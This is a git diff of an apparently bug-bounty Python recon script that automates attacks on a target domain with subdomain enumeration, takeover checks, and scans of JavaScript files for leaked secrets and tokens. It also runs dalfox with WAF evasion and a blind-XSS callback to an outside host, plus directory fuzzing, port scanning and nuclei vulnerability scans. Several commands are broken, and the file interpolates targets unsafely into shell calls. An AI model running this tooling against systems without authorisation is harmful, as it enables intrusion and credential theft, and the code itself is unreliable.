@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-from tqdm import tqdm
 import subprocess
 import time
 import os
@@ -53,34 +52,32 @@ target_name = target.split(".")[0]
 
 
 # Get Access Tokens & Create Main Directory
-def get_access_tokens():
 
-	github_token = input("[+] Enter your github access token : ")
-	time.sleep(2)
-	with open("github_token.txt" , "w") as f:
-		f.write(github_token)
-		f.close()
-	print("[+] Done! Github token saved successfully")
-	print("")
-	print("[+] Creating " + target_name + " Directory .......")
-	subprocess.call("mkdir " + target_name, shell=True)
-	print("")
-	print("[+] Change directory to " + target_name)
-	os.chdir(target_name)
-	print("")
-	time.sleep(3)
-get_access_tokens()
+github_token = input("[+] Enter your github access token : ")
+time.sleep(2)
+with open("github_token.txt" , "w") as f:
+	f.write(github_token)
+	f.close()
+print("[+] Done! Github token saved successfully")
+print("")
+print("[+] Creating " + target_name + " Directory .......")
+subprocess.call("mkdir " + target_name, shell=True)
+print("")
+print("[+] Change directory to " + target_name)
+os.chdir(target_name)
+print("")
+time.sleep(3)
+
 
 # Type Of Scan
-def Target_Scope():
 
-	print("[1] deep")
-	print("[2] fast")
-	print("")
-	Scan = input("[+] Do you want deep or fast scan : ")
-	subprocess.call("clear" , shell=True)
-	time.sleep(3)
-Target_Scope()
+print("[1] deep")
+print("[2] fast")
+print("")
+Scan = input("[+] Do you want deep or fast scan : ")
+subprocess.call("clear" , shell=True)
+time.sleep(3)
+
 
 def Sub_Domains():
 
@@ -103,7 +100,7 @@ def Sub_Domains():
         print("                          ##### Sublist3r #####                                       ")
         time.sleep(3)
         print("")
-        subprocess.call("sublist3r -t 4 -d " + target + " -o sublist3r.txt 2>/dev/null" ,  shell=True)
+        subprocess.call("python3 ~/Tools/Sublist3r/sublist3r.py -t 4 -d " + target + " -o sublist3r.txt 2>/dev/null" ,  shell=True)
         print("")
         print("")
         print("                         ##### Assetfinder #####                                     ")
@@ -169,7 +166,7 @@ def Sub_Domains():
         print("                            ##### Sublist3r #####                                       ")
         time.sleep(3)
         print("")
-        subprocess.call("sublist3r -t 4 -d " + target + " -o sublist3r.txt 2>/dev/null" ,  shell=True)
+        subprocess.call("python3 ~/Tools/Sublist3r/sublist3r.py -t 4 -d " + target + " -o sublist3r.txt 2>/dev/null" ,  shell=True)
         print("")
         print("                            ##### Assetfinder #####                                     ")
         time.sleep(3)
@@ -203,7 +200,7 @@ def Collect_ips():
     print("")
     time.sleep(5)
     subprocess.call("cat hosts.txt | httpx -silent -pa -t 300 -o ip.txt", shell=True)
-    subprocess.call("cat ip.txt | cut -d "[" -f 2 | cut -d "]" -f 1 | anew ips.txt" , shell=True)
+    subprocess.call("cat ip.txt | cut -d '[' -f 2 | cut -d ']' -f 1 | anew ips.txt" , shell=True)
     subprocess.call("rm -rf ip.txt", shell=True)
     subprocess.call("clear" ,shell=True)
 
@@ -230,17 +227,22 @@ def Subdomain_TakeOver():
     time.sleep(3)
     print("")
     subprocess.call("SubOver -l ../subdomains.txt -a -t 100 -v -https -timeout 30 | anew subover.txt " ,shell=True)
-    subprocess.call("cat subover.txt subjack.txt | anew subdomain_takeover.txt " ,shell=True)
-    subprocess.call("rm -rf subover.txt subjack.txt" ,shell=True)
+    print("")
+    print("                              ##### Nuclei #####                                       ")
+    time.sleep(3)
+    print("")
+    subprocess.call("cat ../subdomains.txt | nuclei ~/nuclei-templates/takeovers/ -o nuclei.txt" ,shell=True)
+    subprocess.call("cat subover.txt subjack.txt nuclei.txt | anew subdomain_takeover.txt " ,shell=True)
+    subprocess.call("rm -rf subover.txt subjack.txt nuclei.txt" ,shell=True)
     subprocess.call("cd ../ " ,shell=True)
     subprocess.call("clear", shell=True)
 
- Subdomain_TakeOver()
+Subdomain_TakeOver()
 
 
 def S3bucket():
-	print("   #########################################################################")
-    print("   #                        Searching For AWS S3 buckets                   #")
+    print("   #########################################################################")
+    print("   #                       Searching For AWS S3 Bucket                     #")
     print("   #########################################################################")
     print("")
     time.sleep(5)
@@ -318,6 +320,25 @@ def Extract_JSFiles():
     subprocess.call("clear", shell=True)
 Extract_JSFiles()
 
+#extract juicy data from js-files
+
+def Secret_Finder():
+    print("")
+    print("")
+    print("   #########################################################################")
+    print("   #                Start Extracting Juicy Data From JSFiles               #")
+    print("   #########################################################################")
+    print("")
+    time.sleep(5)
+    print("")
+    print("                                   ##### Nuclei #####                                    ")
+    time.sleep(3)
+    print("")
+    subprocess.call("cat jsfiles.txt | nuclei -t ~/nuclei-templates/exposures -o Secret-Tokens.txt" , shell=True)
+    subprocess.call("cd ../",shell=True)
+    subprocess.call("clear", shell=True)
+Secret_Finder()
+
 #extract all juicy files
 
 def Extract_JuicyFiles():
@@ -331,9 +352,10 @@ def Extract_JuicyFiles():
     subprocess.call("cat endpoints.txt | grep '.php$' | grep '.sql$' | grep '.tar$' | grep '.zip$' | grep '.rar$' | grep '.bak$' | grep '.gz$' | grep '.conf$' | grep '.config$' | grep '.yaml$' | grep '.sh$' | grep '.py$' | grep '.xml' | grep '.info$' | grep '.json$' | grep '.pl$' | grep '.rb$' | grep '.csv$' | grep '.xls$' | grep '.xlsx$' | grep '.txt$' | anew juicy-files.txt " , shell=True)
     subprocess.call("cat juicy-files.txt |sort -u | anew juicy_files.txt " ,shell=True)
     subprocess.call("rm -rf juicy-files.txt" ,shell=True)
-    subprocess.call("cd ../", shell=True)
+    subprocess.call("cd ../",shell=True)
     subprocess.call("clear", shell=True)
 Extract_JSFiles()
+
 
 #search for reflected xss
 
@@ -345,13 +367,38 @@ def Reflected_XSS():
     print("   #########################################################################")
     print("")
     time.sleep(5)
+    subprocess.call("mkdir Reflected-XSS", shell=True)
+    os.chdir("Reflected-XSS")
+    print("")
+    print("                           ##### ParamSpider && Kxss && dalfox #####                                  ")
+    time.sleep(3)
+    print("")
     subprocess.call("python3 ~/Tools/ParamSpider/paramspider.py -d " + target + " -l high" , shell=True)
-    subprocess.call("cat juicy-files.txt |sort -u | anew juicy_files.txt " ,shell=True)
-    subprocess.call("rm -rf juicy-files.txt" ,shell=True)
+    subprocess.call("mv " + target + ".txt . && rm -rf output && mv " + target + ".txt params.txt"  ,shell=True)
+    subprocess.call("cat params.txt | kxss | grep '< >' | cut -d ' ' -f 2 | anew unfiltered.txt" ,shell=True)
+    subprocess.call("dalfox file unfiltered.txt --waf-evasion --user-agent -b 0xmarWan7A.xss.ht pipe -o XSS_poc.txt" ,shell=True)
     subprocess.call("cd ../", shell=True)
     subprocess.call("clear", shell=True)
 Reflected_XSS()
 
+def technologies_detect():
+    print("")
+    print("")
+    print("   #########################################################################")
+    print("   #                      Start Searching For Technologies                 #")
+    print("   #########################################################################")
+    print("")
+    time.sleep(5)
+    subprocess.call("mkdir Technologies", shell=True)
+    os.chdir("Technologies")
+    print("")
+    print("                                   ##### nuclei #####                                    ")
+    time.sleep(3)
+    print("")
+    subprocess.call("cat ../hosts.txt | nuclei -t ~/nuclei-templates/technologies/ -o technologies.txt" , shell=True)
+    subprocess.call("cd ../", shell=True)
+    subprocess.call("clear", shell=True)
+technologies_detect()
 
 #bruteforcing directories using ffuf
 
@@ -363,53 +410,68 @@ def Directory_Fuzzing():
     print("   #########################################################################")
     print("")
     time.sleep(5)
-    subprocess.call("mkdir Content-Discovery", shell=True)
-    os.chdir("Content-Discovery")
+    subprocess.call("mkdir Fuzz", shell=True)
+    os.chdir("Fuzz")
     print("")
-    print("                                 ##### FFUF #####                                    ")
+    print("                                   ##### FFUF #####                                    ")
     time.sleep(3)
     print("")
     subprocess.call("ffuf -u HFUZZ:WFUZZ -X POST -w ../hosts.txt:HFUZZ -w ~/Wordlists/Fuzz.txt:WFUZZ -t 50 -c -v -r -o dir.txt" ,shell=True)
-
+    subprocess.call("cd ../", shell=True)
+    subprocess.call("clear", shell=True)
 Directory_Fuzzing() 
 
 
 # port scan
 
-print("")
-print("")
-print("   #########################################################################")
-print("   #                             Start Port Scanning                       #")
-print("   #########################################################################")
-print("")
-time.sleep(5)
-subprocess.call("mkdir port_scan " ,shell=True)
-print("[+] Creating port_scan directory ")
-os.chdir("port_scan")
-subprocess.call("naabu -iL ../hosts.txt -top-ports 1000 -o open_ports.txt" , shell=True)
-
+def Port_Scanning():
+    print("")
+    print("")
+    print("   #########################################################################")
+    print("   #                             Start Port Scanning                       #")
+    print("   #########################################################################")
+    print("")
+    time.sleep(5)
+    subprocess.call("mkdir Port-Scan" ,shell=True)
+    os.chdir("Port-Scan")
+    print("")
+    print("                                   ##### Rustscan #####                                    ")
+    time.sleep(3)
+    print("")
+    subprocess.call("rustscan -a '../ips.txt' --no-nmap --ulimit 10000 | grep 'Open' | sed 's/Open //' | anew open_ports.txt  " , shell=True)
+    subprocess.call("cd ../", shell=True)
+    subprocess.call("clear", shell=True)
+Port_Scanning()
 
 
 #scan vulnerabilities
 
-print("")
-print("")
-print("   #########################################################################")
-print("   #                     Start Scanning For Vulnerabilities                #")
-print("   #########################################################################")
-print("")
-time.sleep(5)
-subprocess.call("mkdir " + auto , shell=True)
-#print("[+] Creating " + auto + "directory ")
-subprocess.call("cd " + auto , shell=True)
-try:
-    subprocess.call("nuclei -l " + Live_subdoamins + " -t /usr/share/nuclei-templates/vulnerabilities/ -t /usr/share/nuclei-templates/takeovers/ -t /usr/share/nuclei-templates/dns/ -t /usr/share/nuclei-templates/cves/ -v -o subdomain_scan.txt " ,shell=True)
-    subprocess.call("nuclei -l " + Live_subdoamins + " -t /usr/share/nuclei-templates/technologies/ -v -o service_info.txt " ,shell=True)
-    subprocess.call("nuclei -l " + Live_subdoamins + " -t /usr/share/nuclei-templates/misconfiguration/ -v -o security_misconfigration.txt " ,shell=True)
-    subprocess.call("nuclei -l jsfile.txt -t /usr/share/nuclei-templates/vulnerabilities/ -v -o tokens.txt " ,shell=True)
-    subprocess.call("cd .." ,shell=True)
+def Vulnerabilities():
+    print("")
+    print("")
+    print("   #########################################################################")
+    print("   #                     Start Scanning For Vulnerabilities                #")
+    print("   #########################################################################")
+    print("")
+    time.sleep(5)
+    subprocess.call("mkdir Vulnerabilities", shell=True)
+    os.chdir("Vulnerabilities")
+    print("")
+    print("                                   ##### Nuclei #####                                    ")
+    time.sleep(3)
+    print("")
+    try:
+        subprocess.call("nuclei -l ../hosts.txt -t ~/nuclei-templates/ -et ~/nuclei-templates/technologies/ -et ~/nuclei-templates/takeovers/ -v -o Vulnerabilities.txt" ,shell=True)
+        subprocess.call("cat Vulnerabilities | grep -i 'info' | anew info.txt ", shell=True)
+        subprocess.call("cat Vulnerabilities | grep -i 'low' | anew low.txt ", shell=True)
+        subprocess.call("cat Vulnerabilities | grep -i 'medium' | anew medium.txt ", shell=True)
+        subprocess.call("cat Vulnerabilities | grep -i 'high' | anew high.txt ", shell=True)
+        subprocess.call("cat Vulnerabilities | grep -i 'critical' | anew critical.txt ", shell=True)
+        subprocess.call("cat Vulnerabilities | grep -i 'unknown' | anew unknown.txt ", shell=True)
+        subprocess.call("cd ../" ,shell=True)
+        subprocess.call("clear", shell=True)
+    except Exception as e:
+        print("[-] Error has occured !" + e)
+        pass
 
-except:
-    print("[-] Error has occured !")
-    pass
-
+Vulnerabilities()
